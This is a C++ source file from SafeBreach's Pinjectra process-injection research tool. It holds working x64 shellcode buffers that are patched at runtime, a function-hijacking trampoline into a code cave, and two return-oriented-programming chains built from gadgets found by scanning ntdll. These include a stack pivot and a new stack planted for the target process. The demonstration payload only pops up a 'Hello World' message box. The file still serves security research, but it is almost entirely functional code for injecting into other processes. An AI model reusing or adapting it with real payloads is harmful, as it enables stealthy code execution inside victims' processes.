// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#define _CRT_SECURE_NO_WARNINGS

// Standard Include's
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>
#include <assert.h>

extern "C" {
	#include "memmem.h"
}

#include "DynamicPayloads.h"

/////////////
// Classes //
/////////////

PINJECTRA_PACKET* _PAYLOAD_5::eval(TStrDWORD64Map& runtime_parameters)
{
	/*
		mov rax,0x1111111111111111
		mov rcx,0x2222222222222222
		mov [rcx],rax
		mov rdx,0x7777777777777777
		mov [rcx+8],rdx
		mov rax,0x4444444444444444
		push rax
		mov rax,0x5555555555555555
		push rax
		xor rcx,rcx
		mov rdx,rsp
		mov r8,rsp
		add r8,8
		xor r9,r9
		mov rax,0x3333333333333333
		sub rsp,0x28
		call rax
		add rsp,0x38
		mov rax,0xdeadbeef
		ret
	*/

	PINJECTRA_PACKET* output;

	// Primary Buffer
	long long marker_tramp_value = 0x1111111111111111;
	char tramp_value[8];
	long long marker_tramp_value2 = 0x7777777777777777;
	char tramp_value2[8];
	long long marker_tramp_addr = 0x2222222222222222;
	long long marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	long long marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	long long marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;
	void *target_function;
	char* payload = (char*)malloc(1000);

	target_function = (void *)runtime_parameters["TARGET_FUNCTION"];

	long long tramp_addr = (long long) target_function;

	void* TEST_F = GetProcAddress(GetModuleHandleA("ntdll"), "NtClose");
	void* TEST_C = GetProcAddress(GetModuleHandleA("ntdll"), "atan");

	memcpy(payload, "\x48\xB8\x11\x11\x11\x11\x11\x11\x11\x11\x48\xB9\x22\x22\x22\x22\x22\x22\x22\x22\x48\x89\x01\x48\xBA\x77\x77\x77\x77\x77\x77\x77\x77\x48\x89\x51\x08\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xC3", PAYLOAD5_SIZE);
	memcpy(tramp_value, target_function, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_tramp_value, 8), tramp_value, 8);
	memcpy(tramp_value2, 8 + (char*) target_function, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_tramp_value2, 8), tramp_value2, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_tramp_addr, 8), &tramp_addr, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_text, 8), text, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_caption, 8), caption, 8);
	memcpy(memmem(payload, 1000, (char*)& marker_func, 8), &func_ptr, 8);

	// Secondary Buffer
	long long marker_tramp_target = 0x6666666666666666;
	char* trampo;
	trampo = (char *)malloc(1 * 13);
	memcpy(trampo, "\x48\xB8\x66\x66\x66\x66\x66\x66\x66\x66\x50\xC3", 13); // mov rax, 0x66666...6666; push rax; ret
	void *cave = (void *)runtime_parameters["TARGET_CAVE"];
	memcpy(memmem(trampo, 12, (char*)& marker_tramp_target, 8), &cave, 8);

	runtime_parameters["TRAMPO"] = (DWORD64)trampo;
	runtime_parameters["TRAMPO_SIZE"] = 13;

	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
	output->buffer = payload;
	output->buffer_size = PAYLOAD5_SIZE;
	output->metadata = &runtime_parameters;

	return output;
}

PINJECTRA_PACKET* _PAYLOAD_4::eval(TStrDWORD64Map& runtime_parameters)
{
	/*
	mov rax,0x4444444444444444
	push rax
	mov rax,0x5555555555555555
	push rax
	xor rcx,rcx
	mov rdx,rsp
	mov r8,rsp
	add r8,8
	xor r9,r9
	mov rax,0x3333333333333333
	sub rsp,0x28  // Extra 8 bytes to make sure the stack is 16-byte aligned.
	call rax
	add rsp,0x38
	mov eax,2 // simulate the return of the original object function
	mov rbx,0x6666666666666666 // restore the original object pointer into rbx
	ret
	*/

	PINJECTRA_PACKET* output;
	DWORD64 old_obj;
	DWORD64 marker_text = 0x4444444444444444;
	char text[8] = "Hello!";
	DWORD64 marker_caption = 0x5555555555555555;
	char caption[8] = "World";
	DWORD64 marker_func = 0x3333333333333333;
	void* func_ptr = MessageBoxA;
	DWORD64 marker_winptr = 0x6666666666666666;

	char *payload = (char*)malloc(PAYLOAD4_SIZE);

	memcpy(payload, "\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\xB8\x02\x00\x00\x00\x48\xBB\x66\x66\x66\x66\x66\x66\x66\x66\xC3", PAYLOAD4_SIZE);
	memcpy(memmem(payload, PAYLOAD4_SIZE, (char*)& marker_text, 8), text, 8);
	memcpy(memmem(payload, PAYLOAD4_SIZE, (char*)& marker_caption, 8), caption, 8);
	memcpy(memmem(payload, PAYLOAD4_SIZE, (char*)& marker_func, 8), &func_ptr, 8);

	old_obj = runtime_parameters["GetWindowLongPtrA_RETURN_VALUE"];
	void* winptr_ptr = &old_obj;
	memcpy(memmem(payload, PAYLOAD4_SIZE, (char*)& marker_winptr, 8), winptr_ptr, 8);

	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	output->buffer = payload;
	output->buffer_size = PAYLOAD4_SIZE;
	output->metadata = &runtime_parameters;

	return output;
}

PINJECTRA_PACKET* _ROP_CHAIN_1::eval(TStrDWORD64Map& runtime_parameters)
{
	PINJECTRA_PACKET* output;
	DWORD64 rop_pos = 0;
	DWORD64* ROP_chain;
	HMODULE ntdll = GetModuleHandleA("ntdll");
	MODULEINFO modinfo;

	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
	int size = modinfo.SizeOfImage;
	//printf("ntdll size: %d\n", size);

	DWORD64 GADGET_loop = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xEB\xFE", 2); // jmp -2
	//printf("GADGET_loop=0x%llx\n", GADGET_loop);

	/*
	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
	00007ff8`5c63b3bf 58              pop     rax
	00007ff8`5c63b3c0 5a              pop     rdx
	00007ff8`5c63b3c1 59              pop     rcx
	00007ff8`5c63b3c2 4158            pop     r8
	00007ff8`5c63b3c4 4159            pop     r9
	00007ff8`5c63b3c6 415a            pop     r10
	00007ff8`5c63b3c8 415b            pop     r11
	00007ff8`5c63b3ca c3              ret
	*/
	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);

	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\xc3", 1);
	//printf("GADGET_ret=0x%llx\n", GADGET_ret);

	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x5C\xC3", 2); // pop rsp; ret
	//printf("GADGET_pivot=0x%llx\n", GADGET_ret);

	DWORD64 GADGET_addrsp = (DWORD64)memmem(((BYTE*)ntdll) + 0x1000, size - 0x1000, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
	//printf("GADGET_addrsp=0x%llx\n", GADGET_addrsp);


	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

	#define DONT_CARE 0
	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
	{
		ROP_chain[rop_pos++] = GADGET_ret;
		//ROP_chain[rop_pos++] = 0;
	}
	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = DONT_CARE; // rax
	DWORD64 text_pos = rop_pos++; // rdx
	ROP_chain[rop_pos++] = NULL; // rcx
	DWORD64 caption_pos = rop_pos++; // r8
	ROP_chain[rop_pos++] = MB_OK; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)MessageBoxA;
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = DONT_CARE; // rax
	DWORD64 saved_return_address = rop_pos++; // rdx
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
	ROP_chain[rop_pos++] = 8; // 8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	ROP_chain[rop_pos++] = GADGET_pivot;
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];

	ROP_chain[caption_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)& ROP_chain[rop_pos++], "Hello");
	ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)& ROP_chain[rop_pos++], "World!");
	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	ROP_chain[rop_pos++] = DONT_CARE;

	// Update Runtime Parameters with ROP-specific Parameters
	runtime_parameters["saved_return_address"] = saved_return_address;
	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
	runtime_parameters["rop_pos"] = rop_pos;

	output->buffer = ROP_chain;
	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
	output->metadata = &runtime_parameters;

	return output;
}

PINJECTRA_PACKET* _ROP_CHAIN_2::eval(TStrDWORD64Map& runtime_parameters)
{
	PINJECTRA_PACKET* output;
	HMODULE ntdll = GetModuleHandleA("ntdll");
	MODULEINFO modinfo;
	GetModuleInformation(GetCurrentProcess(), ntdll, &modinfo, sizeof(modinfo));
	int size = modinfo.SizeOfImage;
	//printf("ntdll size: %d\n", size);

	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	DWORD64 GADGET_loop = (DWORD64)memmem(ntdll, size, "\xEB\xFE", 2); // jmp -2
	//printf("GADGET_loop=0x%llx\n", GADGET_loop);

	//DWORD64 GADGET_write = (DWORD64)memmem(ntdll, size, "\x48\x89\x01\xC3", 4); // mov [rcx],rax; ret

	/*
	7fe:    48 89 1f                mov    QWORD PTR [rdi],rbx
	801:    48 8b 5c 24 60          mov    rbx,QWORD PTR [rsp+0x60]
	806:    48 83 c4 50             add    rsp,0x50
	80a:    5f                      pop    rdi
	80b:    c3                      ret
	*/
	DWORD64 GADGET_write = (DWORD64)memmem(ntdll, size, "\x48\x89\x1f\x48\x8b\x5c\x24\x60\x48\x83\xc4\x50\x5f\xc3", 14);
	//printf("GADGET_write=0x%llx\n", GADGET_write);

	/*
	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
	00007ff8`5c63b3bf 58              pop     rax
	00007ff8`5c63b3c0 5a              pop     rdx
	00007ff8`5c63b3c1 59              pop     rcx
	00007ff8`5c63b3c2 4158            pop     r8
	00007ff8`5c63b3c4 4159            pop     r9
	00007ff8`5c63b3c6 415a            pop     r10
	00007ff8`5c63b3c8 415b            pop     r11
	00007ff8`5c63b3ca c3              ret
	*/
	DWORD64 GADGET_popregs = (DWORD64)memmem(ntdll, size, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	//printf("GADGET_popregs=0x%llx\n", GADGET_popregs);

	DWORD64* ROP_chain;

	ROP_chain = (DWORD64 *)malloc(100 * sizeof(DWORD64));

	DWORD64 old_rsp;
	old_rsp = runtime_parameters["OLD_CTX_RSP"];

	// Prepare new stack (still in the injector process)
	DWORD64 new_stack_pos = ((old_rsp - ((100 * sizeof(DWORD64)) + 8) + 8) & 0xFFFFFFFFFFFFFFF0) - 8; // make sure stack is 16-byte aligned before the return address.
	//printf("new_stack_pos=%llx\n", new_stack_pos);
	DWORD64 rop_pos = 0;
	#define DONT_CARE 0
	ROP_chain[rop_pos++] = DONT_CARE; // rax
	DWORD64 text_pos = rop_pos++; // rdx
	ROP_chain[rop_pos++] = NULL; // rcx
	DWORD64 caption_pos = rop_pos++; // r8
	ROP_chain[rop_pos++] = MB_OK; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)MessageBoxA;
	ROP_chain[rop_pos++] = GADGET_loop;
	ROP_chain[rop_pos++] = 0; // shadow space
	ROP_chain[rop_pos++] = 0; // shadow space
	ROP_chain[rop_pos++] = 0; // shadow space
	ROP_chain[rop_pos++] = 0; // shadow space
	ROP_chain[caption_pos] = new_stack_pos + sizeof(DWORD64) * rop_pos;
	strcpy((char*)& ROP_chain[rop_pos++], "Hello");
	ROP_chain[text_pos] = new_stack_pos + sizeof(DWORD64) * rop_pos;
	strcpy((char*)& ROP_chain[rop_pos++], "World!");

	// Update Runtime Parameters with ROP-specific Parameters
	runtime_parameters["GADGET_loop"] = GADGET_loop;
	runtime_parameters["GADGET_popregs"] = GADGET_popregs;
	runtime_parameters["ROP_POS"] = rop_pos;
	runtime_parameters["NEW_STACK_POS"] = new_stack_pos;
	runtime_parameters["GADGET_write"] = GADGET_write;

	output->buffer = ROP_chain;
	output->buffer_size = 100;
	output->metadata = &runtime_parameters;

	return output;
}
